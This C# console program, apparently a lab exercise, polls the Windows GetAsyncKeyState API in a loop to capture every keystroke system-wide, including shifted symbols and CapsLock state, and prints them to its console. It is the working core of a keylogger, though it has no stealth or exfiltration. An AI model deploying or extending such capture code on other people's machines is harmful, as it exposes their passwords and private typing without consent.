using System;
using System.Runtime.InteropServices;


namespace _4th_LR_1
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("User32.dll")]
        public static extern int GetKeyState(int i);

        static void Main(string[] args)
        {
            while (true)
            {
                System.Threading.Thread.Sleep(150);

                for (int i = 8; i < 223; i++)
                {
                    if (GetAsyncKeyState(i) != 0)
                    {
                        if (GetKeyState(16) == 65408 || GetKeyState(16) == 65409)
                        {
                            switch (i)
                            {
                                case 48: Console.Write("),"); break;
                                case 49: Console.Write("!,"); break;
                                case 50: Console.Write("@,"); break;
                                case 51: Console.Write("#,"); break;
                                case 52: Console.Write("$,"); break;
                                case 53: Console.Write("%,"); break;
                                case 54: Console.Write("^,"); break;
                                case 55: Console.Write("&,"); break;
                                case 56: Console.Write("*,"); break;
                                case 57: Console.Write("(,"); break;
                                case 160: Console.Write("LeftShift,"); break;
                                case 161: Console.Write("RightShift,"); break;
                                case 162: Console.Write("LeftCtrl,"); break;
                                case 163: Console.Write("RightCtrl,"); break;
                                case 164: Console.Write("LeftAlt,"); break;
                                case 165: Console.Write("RightAlt,"); break;
                                case 186: Console.Write(":,"); break;
                                case 187: Console.Write("+,"); break;
                                case 188: Console.Write("<,"); break;
                                case 189: Console.Write("_,"); break;
                                case 190: Console.Write(">,"); break;
                                case 191: Console.Write("?,"); break;
                                case 192: Console.Write("~,"); break;
                                case 219: Console.Write("{,"); break;
                                case 220: Console.Write("|,"); break;
                                case 221: Console.Write("},"); break;
                                case 222: Console.Write('"' + ","); break;
                                default:
                                    if ((i >= 'A' && i <= 'Z'))
                                        Console.Write(Console.CapsLock ? (char)(i + 32) + "," : (char)i + ",");
                                    else
                                    {
                                        ConsoleKey key = (ConsoleKey)i;
                                        if (!(key.ToString() == "16" || key.ToString() == "17" || key.ToString() == "18"))
                                            Console.Write(key.ToString() + ',');
                                    }
                                    break;
                            }
                        }
                        else
                        {
                            switch (i)
                            {
                                case 20: Console.Write("CapsLock,"); break;
                                case 160: Console.Write("LeftShift,"); break;
                                case 161: Console.Write("RightShift,"); break;
                                case 162: Console.Write("LeftCtrl,"); break;
                                case 163: Console.Write("RightCtrl,"); break;
                                case 164: Console.Write("LeftAlt,"); break;
                                case 165: Console.Write("RightAlt,"); break;
                                case 186: Console.Write(";,"); break;
                                case 187: Console.Write("=,"); break;
                                case 188: Console.Write(",,"); break;
                                case 189: Console.Write("-,"); break;
                                case 190: Console.Write(".,"); break;
                                case 191: Console.Write("/,"); break;
                                case 192: Console.Write("`,"); break;
                                case 219: Console.Write("[,"); break;
                                case 220: Console.Write("\\,"); break;
                                case 221: Console.Write("],"); break;
                                case 222: Console.Write("',"); break;
                                default:
                                    if ((i >= 'A' && i <= 'Z') || (i >= '0' && i <= '9'))
                                        Console.Write((Console.CapsLock || (i >= '0' && i <= '9')) ? (char)i + "," : (char)(i + 32) + ",");
                                    else
                                    {
                                        ConsoleKey key = (ConsoleKey)i;
                                        if (!(i <= 18 && i >= 16))
                                            Console.Write(key.ToString() + ',');
                                    }
                                    break;
                            }
                        }
                    }
                }
            }
        }
    }
}
